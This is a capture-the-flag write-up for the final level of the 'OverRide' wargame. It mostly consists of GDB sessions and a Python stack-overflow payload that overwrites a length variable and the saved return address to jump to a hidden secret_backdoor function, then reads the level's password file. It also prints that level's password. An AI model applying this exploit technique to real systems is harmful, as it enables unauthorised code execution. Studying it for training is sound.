# Level 09

Once logged in, you will see a binary.

```
$ ssh localhost -p 4444 -l level09
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on localhost:4242
level09@localhost's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
level09@OverRide:~$ ls
level09
```

By running the program, the prompt opens for asking a name, and message to send to `@Unix-Dude`.

```
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: sucho
>: Welcome, sucho
>: Msg @Unix-Dude
>>: hi
>: Msg sent!
level09@OverRide:~$
```

By decompiling the binary, there are a function that is never called named `secret_backdoor` that gets user input and stores it into the buffer (a local variable), and finally it calls the `system()` function with the buffer. The program uses `fgets()`, `printf()`, `strncpy()` throughout the program, so there may be a chance to exploit the program with buffer overflow.

In the decompiled source, we find that the `set_username` function takes `0x29` (`40`) bytes into the buffer. Because of the way the data is structured, we want to overwrite `i` to be `256` (`\xff`), so that the value initially set up, which is 140, will be able extend the copied length of `strncpy()`.

We want to overwrite the `RIP` register (64 bits version of `EIP`) to the address of the function `secret_backdoor`, and the address only will be correct once you call `run` with GDB.

```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
[...]
0x000000000000088c  secret_backdoor 	# no bueno
[...]
```

```
gdb-peda$ b set_username
Breakpoint 1 at 0x9d1
gdb-peda$ run
[...]
gdb-peda$ info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```

Lastly, we need to find the offset to overwrite the `RIP` register. The reason we want to find `RIP` after calling `set_username` is that that's where all the input will be stored (into `buffer`).

```
   0x55555555490d <handle_msg+77>:	mov    rdi,rax
=> 0x555555554910 <handle_msg+80>:	call   0x5555555549cd <set_username>
   0x555555554915 <handle_msg+85>:	lea    rax,[rbp-0xc0]
[...]
Breakpoint 1, 0x0000555555554910 in handle_msg ()
gdb-peda$ info register rax
rax            0x7fffffffe4b0	0x7fffffffe4b0
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffe580:
 rip = 0x555555554910 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe590
 Arglist at 0x7fffffffe570, args:
 Locals at 0x7fffffffe570, Previous frame's sp is 0x7fffffffe580
 Saved registers:
  rbp at 0x7fffffffe570, rip at 0x7fffffffe578
gdb-peda$ p/d 0x7fffffffe578 - 0x7fffffffe4b0
$4 = 200
```

So, the offset is `200`.

Our payload will be structured as follows:
```
// // Provided for readability
// struct {
//		char buf_1[140];
//		char buf_2[40];
//		unsigned int num;
// };

# pseudocode
[First 40 bytes random character] + [a value to overwrite a variable `num` in the struct] + [fill up rest of the buffer] + [address for function `secret_backdoor`]

# working it out
"A"*40 + 256(it can be any) + "B" * 200 (the offset) + 0x000055555555488c

# prepping for action
python -c 'import struct; print "A"*40 + "\xff\n" + "B"*200 + struct.pack("L", 0x000055555555488c)' # I stands for unsigned int, L stands for unsigned long

# ready for action!
(python -c 'import struct; print "A"*40 + "\xff\n" + "B"*200 + struct.pack("L", 0x000055555555488c)'; cat -) | ./level09
```

And now in action!

```
level09@OverRide:~$ (python -c 'import struct; print "A"*40 + "\xff\n" + "B"*200 + struct.pack("L", 0x000055555555488c)'; cat -) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/$(whoami)/.pass
Segmentation fault (core dumped)
level09@OverRide:~$ (python -c 'import struct; print "A"*40 + "\xff\n" + "B"*200 + struct.pack("L", 0x000055555555488c)'; cat -) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/$(whoami)/.pass

j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
level09@OverRide:~$
level09@OverRide:~$ su end
Password:
end@OverRide:~$ ls
end
end@OverRide:~$ ./end
./end: line 1: GG: command not found
end@OverRide:~$
```

gg, Override!

```
  ________  ________
 /  _____/ /  _____/
/   \  ___/   \  ___
\    \_\  \    \_\  \
 \______  /\______  /
        \/        \/
```
